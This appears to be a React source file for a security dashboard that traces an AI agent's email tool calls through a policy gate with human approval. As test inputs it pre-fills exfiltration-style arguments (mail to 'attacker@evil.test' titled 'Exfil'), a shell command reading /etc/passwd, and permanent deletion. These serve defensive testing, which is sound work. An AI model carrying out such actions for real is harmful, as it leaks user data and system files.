"use client";

import React, { useState } from "react";
import {
  Terminal,
  Play,
  Trash2,
  UserCheck,
  ChevronDown,
  ChevronUp,
  Clock
} from "lucide-react";
import { ToolExecutionResult, Policy } from "@/types";
import { EMAIL_MCP_TOOLS } from "@/lib/mcp/email-tools";
import { executeGatedToolCall } from "@/lib/policy/engine";

interface RuntimeTraceProps {
  traces: ToolExecutionResult[];
  policy: Policy | null;
  onClearTraces: () => void;
  onApproveTrace: (traceId: string, toolName: string, args?: Record<string, unknown>) => void;
  onAddManualTrace: (trace: ToolExecutionResult) => void;
}

export function RuntimeTrace({
  traces,
  policy,
  onClearTraces,
  onApproveTrace,
  onAddManualTrace
}: RuntimeTraceProps) {
  const [selectedToolToInvoke, setSelectedToolToInvoke] = useState<string>("sendEmail");
  const [customToolName, setCustomToolName] = useState<string>("executeArbitraryShell");
  const [isCustomTool, setIsCustomTool] = useState<boolean>(false);
  const [customArgs, setCustomArgs] = useState<string>('{"to": "attacker@evil.test", "subject": "Dump"}');
  const [expandedTraceId, setExpandedTraceId] = useState<string | null>(null);

  const handleManualInvoke = async () => {
    let parsedArgs: Record<string, unknown> = {};
    try {
      parsedArgs = JSON.parse(customArgs);
    } catch {
      parsedArgs = { raw: customArgs };
    }

    const effectiveTool = isCustomTool ? customToolName.trim() : selectedToolToInvoke;
    if (!effectiveTool) return;

    try {
      const res = await fetch("/api/execute", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          toolName: effectiveTool,
          policy,
          args: parsedArgs,
          bypassPolicy: false
        })
      });
      const data = await res.json();
      if (data.success && data.trace) {
        onAddManualTrace(data.trace);
        return;
      }
    } catch {
      // Offline fallback to client evaluation
    }

    const newTrace = executeGatedToolCall(effectiveTool, policy, parsedArgs, false);
    onAddManualTrace(newTrace);
  };

  return (
    <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 shadow-xl space-y-4">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-3">
        <div className="flex items-center gap-2.5">
          <span className="flex h-6 w-6 rounded-full bg-cyan-500/20 border border-cyan-500/40 items-center justify-center text-xs font-mono font-bold text-cyan-400">
            5
          </span>
          <div>
            <div className="flex items-center gap-2">
              <h2 className="text-sm font-semibold text-white tracking-wide uppercase font-mono">
                Runtime Policy Gate Execution Trace
              </h2>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-500/10 text-cyan-300 border border-cyan-500/30">
                {traces.length} events logged
              </span>
            </div>
            <p className="text-xs text-slate-400">
              Live audit stream of tool calls evaluated through deterministic runtime gate
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {traces.length > 0 && (
            <button
              type="button"
              onClick={onClearTraces}
              className="text-xs text-slate-400 hover:text-slate-200 flex items-center gap-1 font-mono px-2.5 py-1 rounded bg-slate-950 border border-slate-800"
            >
              <Trash2 className="h-3 w-3" />
              Clear Trace Log
            </button>
          )}
        </div>
      </div>

      {/* Interactive Tool Invoker Bar */}
      <div className="bg-slate-950/70 border border-slate-800/90 rounded-xl p-3 space-y-2">
        <div className="flex items-center justify-between">
          <span className="text-xs font-mono text-slate-300 flex items-center gap-1.5">
            <Play className="h-3.5 w-3.5 text-indigo-400" />
            Manual Capability Gate Evaluator:
          </span>
          <span className="text-[11px] text-slate-500 font-mono">
            {policy ? "Enforcing active policy" : "Zero-trust default"}
          </span>
        </div>

        <div className="flex flex-col sm:flex-row gap-2">
          <select
            value={isCustomTool ? "__custom__" : selectedToolToInvoke}
            onChange={e => {
              const val = e.target.value;
              if (val === "__custom__") {
                setIsCustomTool(true);
                setCustomArgs('{"command": "cat /etc/passwd"}');
              } else {
                setIsCustomTool(false);
                setSelectedToolToInvoke(val);
                if (val === "sendEmail") {
                  setCustomArgs('{"to": "attacker@evil.test", "subject": "Exfil"}');
                } else if (val === "deleteEmail") {
                  setCustomArgs('{"messageId": "msg_mal_202", "permanent": true}');
                } else if (val === "downloadAttachment") {
                  setCustomArgs('{"filename": "payload.pdf", "attachmentId": "att_981"}');
                } else if (val === "searchEmails") {
                  setCustomArgs('{"query": "confidential documents"}');
                } else if (val === "readEmail") {
                  setCustomArgs('{"messageId": "msg_norm_101"}');
                } else if (val === "createDraft") {
                  setCustomArgs('{"to": "sarah@company.com", "subject": "Reply", "body": "Draft reply"}');
                } else {
                  setCustomArgs('{}');
                }
              }
            }}
            className="px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs font-mono text-slate-200 focus:outline-none focus:border-indigo-500"
          >
            {EMAIL_MCP_TOOLS.map(t => (
              <option key={t.name} value={t.name}>
                {t.name} ({t.riskLevel} risk)
              </option>
            ))}
            <option value="__custom__">⚡ Custom / Novel Tool (Test Zero-Trust)...</option>
          </select>

          {isCustomTool && (
            <input
              type="text"
              value={customToolName}
              onChange={e => setCustomToolName(e.target.value)}
              placeholder="e.g. executeArbitraryShell, dropDb"
              className="px-3 py-1.5 bg-slate-900 border border-amber-600/70 rounded-lg text-xs font-mono text-amber-300 focus:outline-none focus:border-amber-500 w-48"
              title="Enter any novel or undeclared tool name to test Zero-Trust Default Deny"
            />
          )}

          <input
            type="text"
            value={customArgs}
            onChange={e => setCustomArgs(e.target.value)}
            placeholder='{"key": "value"}'
            className="flex-1 px-3 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs font-mono text-slate-200 focus:outline-none focus:border-indigo-500"
          />

          <button
            type="button"
            onClick={handleManualInvoke}
            className="px-4 py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-xs font-medium font-mono transition-colors flex items-center justify-center gap-1.5 shrink-0"
          >
            <Play className="h-3 w-3" />
            Evaluate Gate
          </button>
        </div>
      </div>

      {/* Traces Stream */}
      {traces.length === 0 ? (
        <div className="bg-slate-950/40 rounded-xl p-8 border border-dashed border-slate-800 text-center space-y-1 font-mono text-xs text-slate-500">
          <Terminal className="h-6 w-6 mx-auto text-slate-600 mb-1" />
          <div>Runtime trace log is idle.</div>
          <p className="text-[11px] text-slate-600">
            Run an attack simulation or evaluate a manual tool call above to stream live gate decisions.
          </p>
        </div>
      ) : (
        <div className="space-y-2 max-h-[480px] overflow-y-auto pr-1">
          {traces.map(trace => {
            const isAllowed = trace.status === "allowed";
            const isApproval = trace.status === "approval_required";
            const isExpanded = expandedTraceId === trace.id;

            return (
              <div
                key={trace.id}
                className={`rounded-xl p-3 border transition-colors ${
                  isAllowed
                    ? "bg-emerald-950/15 border-emerald-800/40"
                    : isApproval
                    ? "bg-amber-950/15 border-amber-800/40"
                    : "bg-rose-950/15 border-rose-800/40"
                }`}
              >
                <div className="flex items-center justify-between gap-2 flex-wrap font-mono text-xs">
                  <div className="flex items-center gap-2">
                    <span className="text-slate-500 text-[11px] flex items-center gap-1">
                      <Clock className="h-3 w-3" />
                      {trace.timestamp}
                    </span>
                    <span className="font-semibold text-white">
                      {trace.tool}()
                    </span>
                    <span className="text-[10px] text-slate-500">
                      +{trace.durationMs}ms
                    </span>
                  </div>

                  <div className="flex items-center gap-2">
                    {/* Human Approval Action */}
                    {isApproval && (
                      <button
                        type="button"
                        onClick={() => onApproveTrace(trace.id, trace.tool, trace.args)}
                        className="px-2.5 py-1 rounded bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-[11px] font-medium flex items-center gap-1 transition-colors"
                      >
                        <UserCheck className="h-3 w-3" />
                        Approve Invocation
                      </button>
                    )}

                    <span
                      className={`text-[10px] uppercase px-2 py-0.5 rounded-md font-bold tracking-wider ${
                        isAllowed
                          ? "bg-emerald-500/20 text-emerald-300 border border-emerald-500/30"
                          : isApproval
                          ? "bg-amber-500/20 text-amber-300 border border-amber-500/30"
                          : "bg-rose-500/20 text-rose-300 border border-rose-500/30"
                      }`}
                    >
                      {trace.status}
                    </span>

                    <button
                      type="button"
                      onClick={() => setExpandedTraceId(isExpanded ? null : trace.id)}
                      className="text-slate-400 hover:text-white p-0.5"
                    >
                      {isExpanded ? <ChevronUp className="h-3.5 w-3.5" /> : <ChevronDown className="h-3.5 w-3.5" />}
                    </button>
                  </div>
                </div>

                {/* Reason */}
                <div className="text-xs text-slate-300 mt-1.5 leading-relaxed font-sans">
                  {trace.reason}
                </div>

                {/* Expanded Details */}
                {isExpanded && (
                  <div className="mt-2.5 pt-2.5 border-t border-slate-800/80 space-y-2 text-xs font-mono">
                    {trace.args && Object.keys(trace.args).length > 0 && (
                      <div>
                        <div className="text-[10px] text-slate-500 mb-0.5">Arguments:</div>
                        <pre className="bg-slate-950 p-2 rounded border border-slate-800/80 text-cyan-300 text-[11px] overflow-x-auto">
                          {JSON.stringify(trace.args, null, 2)}
                        </pre>
                      </div>
                    )}

                    {Boolean(trace.output) && (
                      <div>
                        <div className="text-[10px] text-slate-500 mb-0.5">Gate Return / Side Effect:</div>
                        <pre className="bg-slate-950 p-2 rounded border border-slate-800/80 text-emerald-300/80 text-[11px] overflow-x-auto">
                          {JSON.stringify(trace.output, null, 2)}
                        </pre>
                      </div>
                    )}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}
